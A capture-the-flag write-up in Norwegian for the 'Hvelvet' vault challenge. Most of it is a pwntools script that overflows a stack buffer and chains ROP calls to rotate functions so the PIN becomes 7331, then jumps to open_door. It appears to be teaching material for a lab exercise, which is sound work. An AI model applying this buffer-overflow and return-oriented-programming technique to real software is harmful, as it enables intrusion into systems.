# Writeup [Hvelvet](./README.md)

## Challenge description
---

## Writeup
Enkel ROP for å rotete julet så PIN koden blir `7331`.

```python
#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vault')

host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

OFFSET = 40
ROTATE_LEFT  = p64(exe.symbols['rotate_left'])
ROTATE_RIGHT = p64(exe.symbols['rotate_right'])

payload = b'A' * OFFSET
payload += ROTATE_LEFT*3
payload += ROTATE_RIGHT * (3 + 3)
payload += ROTATE_LEFT * (3+7)
payload += ROTATE_RIGHT * (7+1)
payload += p64(exe.symbols['open_door'])

io.sendlineafter(b'passphrase: ', payload)
io.interactive()
```
